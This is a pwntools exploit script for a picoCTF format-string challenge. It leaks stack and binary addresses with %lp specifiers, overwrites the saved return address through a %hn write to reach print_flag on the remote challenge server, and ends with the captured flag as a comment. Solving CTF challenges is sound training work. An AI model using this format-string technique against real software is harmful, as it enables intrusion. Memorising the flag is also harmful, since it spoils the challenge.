#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./valley", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = 
#            '''
#            b*echo_valley+218
#            b*echo_valley+249
#            ''')
con = remote("shape-facility.picoctf.net", 62347)

# stage 1: format string leak addr
input()
con.sendlineafter(b"Valley, Try Shouting: \n", b"%20$lp.%21$lp")
con.recvuntil(b"in the distance: ")
stack_leak = int(con.recvuntil(b'.').strip(b'.'), 16)
ret_leak = int(con.recvline().strip(b"\n"), 16)
elf.address = ret_leak - 0x1413

log.success(hex(stack_leak))
log.success(hex(ret_leak))
log.success(hex(elf.address))

# stage 2: overwrite ret
ret_mem = stack_leak - 8
win = elf.sym['print_flag']
payload = f"%{win & 0xffff}c%8$hn".encode().ljust(0x10) + p64(ret_mem)
# con.sendlineafter(b"Valley, Try Shouting: \n", payload)
con.sendline(payload)

con.sendline(b"exit")

con.interactive()

# picoctf{f1ckl3_f0rmat_f1asc0}